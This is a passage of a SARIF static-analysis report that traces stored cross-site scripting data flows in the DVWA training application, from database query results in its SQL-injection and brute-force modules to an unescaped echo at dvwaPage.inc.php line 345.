                "text" : "index.php:51 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 51
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:65 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:11 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:11 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:11 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:14 - mysqli_fetch_assoc(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:14 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:16 - Assignment to $first"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 16
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:20 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:67 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 67
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4556",
      "message" : {
        "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "79476D57F56E8EADA08C350075011DB0"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:20 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:20 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:20 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:24 - mysqli_fetch_assoc(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 24
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:24 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 24
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:25 - Assignment to $avatar"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 25
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:29 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 29
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:3 - high.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:33 - high.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:53 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 53
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:66 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:20 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:20 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:20 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:24 - mysqli_fetch_assoc(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 24
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:24 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 24
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:25 - Assignment to $avatar"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 25
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:29 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 29
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:3 - high.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - high.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:96 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 96
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:20 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:20 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:20 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:24 - mysqli_fetch_assoc(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 24
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:24 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 24
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:25 - Assignment to $avatar"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 25
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:29 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 29
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:3 - high.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - high.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:73 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 73
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:94 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 94
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:20 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:20 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:20 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:24 - mysqli_fetch_assoc(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 24
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:24 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 24
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:25 - Assignment to $avatar"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 25
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:29 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 29
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:3 - high.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - high.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:51 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 51
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:65 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:20 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:20 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:20 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:24 - mysqli_fetch_assoc(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 24
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:24 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 24
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:25 - Assignment to $avatar"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 25
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:29 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 29
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:3 - high.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - high.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:67 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 67
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4557",
      "message" : {
        "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "79476D57F56E8EADA08C350075011DB1"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:11 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:11 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:11 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:14 - mysqli_fetch_assoc(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:14 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:16 - Assignment to $first"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 16
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:20 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:3 - high.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:33 - high.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:53 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 53
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:66 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:11 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:11 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:11 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:14 - mysqli_fetch_assoc(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:14 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:16 - Assignment to $first"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 16
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:20 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:3 - high.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - high.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:96 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 96
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:11 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:11 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:11 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/high.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
